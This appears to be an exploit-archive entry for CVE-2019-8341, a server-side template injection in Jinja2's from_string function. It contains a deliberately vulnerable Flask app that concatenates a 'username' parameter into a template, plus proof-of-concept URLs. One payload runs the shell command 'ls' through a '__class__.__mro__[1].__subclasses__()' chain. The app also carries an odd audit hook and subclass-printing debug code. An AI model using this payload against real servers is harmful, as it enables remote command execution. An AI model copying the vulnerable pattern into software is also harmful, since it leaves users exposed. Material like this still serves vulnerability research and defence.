'''
# Exploit Title: Jinja2 Command injection from_string function
# Date: [date]
# Exploit Author: JameelNabbo
# Website: Ordina.nl
# Vendor Homepage: http://jinja.pocoo.org
# Software Link: https://pypi.org/project/Jinja2/#files
# Version: 2.10
# Tested on: Kali Linux
# CVE-2019-8341


// from_string function is prone to SSTI where it takes the "source" parameter as a template object and render it and then return it.


//here's an example about the vulnerable code that uses from_string function in order to handle a variable in GET called 'username' and returns Hello {username}:
'''

from flask import Flask, request, render_template_string, send_from_directory
import jinja2
import sys
import os
app = Flask(__name__)
def hook(evt, arg):
    if evt in ["sys._getframe", "object.__getattr__", "object.__setattr__"]:
        return
    frame = sys._getframe(0)
    f = frame.f_code.co_filename
    
    while frame:
        if frame.f_back is None:
            break
        else:
            frame = frame.f_back
        
        func_name = frame.f_code.co_name
        if frame.f_code.co_filename == f:
                    
            if func_name == "index":
                if evt not in ['compile', 'exec']:
                    raise RuntimeError('Event not allowed')
sys.addaudithook(hook)
# HTML="index.html"

@app.route("/")
def index():
    # message = request.args.get("message")
    # return render_template_string(HTML.format(message))
    username = request.values.get('username')
    if username:
        tmp="".__class__.__mro__[1].__subclasses__()
        for i, x in enumerate(tmp):
            print(i, x)
        return jinja2.environment.Environment().from_string('Hello ' + username).render()
    else:
        return jinja2.environment.Environment().from_string('Hello guest').render()
        # return "Hello guest"

if __name__ == "__main__":
            app.run(host='0.0.0.0' , port=4444)

'''
POC
//Exploiting the username param
http://localhost:4444/?username={{4*4}}
OUTPUT: Hello 16

ls

http://localhost:4444/?username={{"".__class__.__mro__[1].__subclasses__()[367]("ls")}}


How to prevent it:
Never let the user provide template content.
hook in jinja2.environment
'''
            